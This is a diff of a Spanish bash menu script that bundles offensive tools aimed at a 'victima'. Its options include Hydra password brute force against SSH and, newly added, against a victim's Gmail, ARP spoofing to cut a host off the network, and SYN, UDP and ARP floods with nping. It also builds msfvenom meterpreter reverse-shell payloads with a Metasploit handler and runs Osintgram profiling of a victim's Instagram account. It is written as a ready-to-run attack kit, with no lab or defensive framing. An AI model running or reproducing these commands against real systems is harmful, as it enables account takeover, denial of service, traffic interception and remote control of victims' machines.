@@ -1,9 +1,6 @@
 #!/bin/bash
 
-
-
 clear;
-
 
 
 #opcion=0
@@ -17,82 +14,46 @@ do
       clear;
 
       echo " ";
-
       echo " ----------------------------------------------------------";
-
       echo "|                  (っ◔◡◔)っ  Menu                         |";
-
       echo "|----------------------------------------------------------|";
-
       echo "|                         OPCIONES                         |";
-
       echo "|----------------------------------------------------------|";
-
       echo "| 30 - Salir                                               |";    
-
       echo "|----------------------------------------------------------|";
-
-      echo "| 22 - OSINT Instagram                                     |";
-
-      echo "| 21 - OSINT Install                                       |";
-
+      echo "| 23 - OSINT Instagram                                     |";
+      echo "| 22 - OSINT Install                                       |";
       echo "|----------------------------------------------------------|";
-
-      echo "| 20 - TCP Attack                                          |";
-
-      echo "| 19 - UDP Attack                                          |";
-
-      echo "| 18 - ICMP Attack                                         |";
-
-      echo "| 17 - ARP Attack                                          |";
-
+      echo "| 21 - TCP Attack                                          |";
+      echo "| 20 - UDP Attack                                          |";
+      echo "| 19 - ICMP Attack                                         |";
+      echo "| 18 - ARP Attack                                          |";
       echo "|----------------------------------------------------------|";
-
+      echo "| 17 - Hydra GMAIL                                         |";
       echo "| 16 - Borrar metadatos (no borra todos)                   |";
-
       echo "| 15 - Cambiar metadato de archivo                         |";
-
       echo "| 14 - Ver metadatos de un archivo                         |";
-
       echo "| 13 - Extraer texto de imagen                             |";
-
       echo "| 12 - Fusionar texto a imagen                             |";
-
       echo "| 11 - Mostrar contenido oculto de una imagen              |";
-
       echo "| 10 - Añadir contenido a una imagen                       |";
-
       echo "|  9 - Ejecutar Exploit                                    |";
-
       echo "|  8 - Crear Exploit                                       |";
-
       echo "|  7 - Sherlock                                            |";
-
       echo "|  6 - Restablecer red                                     |";
-
       echo "|  5 - Dejar sin red                                       |";
-
       echo "|  4 - Ver S.O de un equipo                                |";
-
       echo "|  3 - Nmap toda la red                                    |";
-
       echo "|  2 - SSH DirectAT                                        |";
-
       echo "|  1 - Hydra SSH                                           |";
-
       echo "|  0 - Instalar dependencias                               |";
-
       echo " ----------------------------------------------------------";
+
+
 
       read -p "Escoge opcion: " opcion;
 
-
-
-
-
       case $opcion in
-
-
 
         0)
 
@@ -172,12 +133,6 @@ do
 
 	sleep 2
 
-	
-
-
-
-
-
         ;;
 
         1)
@@ -188,12 +143,9 @@ do
 
         read -p "IP: " ip
 
-
-
         hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
 
         ;;
-
 
 
         2)
@@ -208,12 +160,9 @@ do
 
         read -p "Que comando quieres usar: " comand
 
-
-
         watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
 
         ;;
-
 
 
         3)
@@ -224,7 +173,7 @@ do
 
         read -p "Parametros? (T4,sP): " parametro
 
-	       nmap -$parametro $red/24
+	      nmap -$parametro $red/24
 
         sleep 60
 
@@ -232,25 +181,20 @@ do
 
         4)
 
-        clear
+
+       clear
 
         read -p "Dime el equipo que quieres comprobar: " eq
-
-
 
         nmap -T4 -O $eq
 
         ;;
-
-
 
         5)
 
         #read -p "Dime la ip del gateway: " gateway
 
         read -p "Dime la ip de la victima: " victima
-
-
 
         arpspoof -t $victima 192.168.12.10 2> /dev/null &
 
@@ -262,19 +206,15 @@ do
 
         ;;
 
-
-
         6)
 
         killall arpspoof
 
-        ;;
+       ;;
 
         7)
 
         read -p "Dime el usuario que quieres investigar: " usr
-
-
 
         cd sherlock
 
@@ -289,15 +229,13 @@ do
         8)
 
 
-
         read -p "Dime como quieres que se llame el exploit: " exp
 
-	        read -p "Dime tu IP: " ip
+        read -p "Dime tu IP: " ip
 
         msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp
 
         ;;
-
 
 
         9)
@@ -311,8 +249,6 @@ do
         echo "set LHOST $ip" >> exploit.rc
 
         echo "run" >> exploit.rc
-
-
 
         msfconsole -q -r exploit.rc
 
@@ -347,8 +283,6 @@ do
         read -p "Dime el nombre de la imagen: " nimagen
 
         read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch
-
-
 
         echo $texto > $arch 
 
@@ -396,15 +330,25 @@ do
 
         ;;
 
-        17)
+	17)
+
+      	read -p "Dime el correo electronico de la victima: " visti
+
+        hydra -s 465 -S -v -V -l $visti -P diccionario.txt -e s -f -t 16 smtp.gmail.com smtp
+
+        sleep 20
+
+        ;;
+
+        18)
 
         read -p "Dime la ip de la Víctima: " ip
 
         nping --arp --rate 3000 -c 100000 $ip
 
-	;;
+       	;;
 
-        18)
+        19)
 
         read -p "Dime la ip de la Víctima: " ip
 
@@ -412,64 +356,67 @@ do
 
         ;;
 
-        19)
+        20)
 
         read -p "Dime la ip de la Víctima: " ip
 
         nping --udp --flags syn --rate 3000 -c 100000 $ip
 
-	;;
+      	;;
 
-        20)
+        21)
 
         read -p "Dime la ip de la Víctima: "  ip
 
         nping --tcp --flags syn --rate 3000 -c 100000 $ip
 
-	;;
+      	;;
 
-	21)
+      	22)
+      
+      	git clone https://github.com/Datalux/Osintgram.git
 
-	git clone https://github.com/Datalux/Osintgram.git
+      	sudo pip install geopy
 
-	sudo pip install geopy
+      	cd Osintgram
 
-	cd Osintgram
+        sudo pip3 install instagram_private_api
 
-	sleep 5
+        sudo pip3 install PrettyTable
 
-	make setup
+      	sudo pip3 install -r requirements.txt
 
-	sleep 20
+      	sleep 5
 
-	cd ..
+	      clear
 
-	;;
+	      echo "Acuerdate de ir al directorio Osintgram y ejecutar el cómando make setup con la cuenta del bot de instagram"
 
-	22)
+	      sleep 20
 
-	read -p "Dime el usuario de la victima: " $urs
+	      cd ..
 
-  	python3 Osintgram/main.py $urs
+       	;;
 
-	sleep 20
+      	23)
 
-	;;
+      	read -p "Dime el usuario de la victima: " urs
+
+      	cd Osintgram/
+
+      	python3 main.py $urs
+
+	    	sleep 10
+
+      	cd ..
+
+	      ;;
 
         30)
-
-                exit
+        
+        exit
 
         ;;
+        esac
 
-
-
-esac
-
-done
-
-
-
-
-
-      
+        done
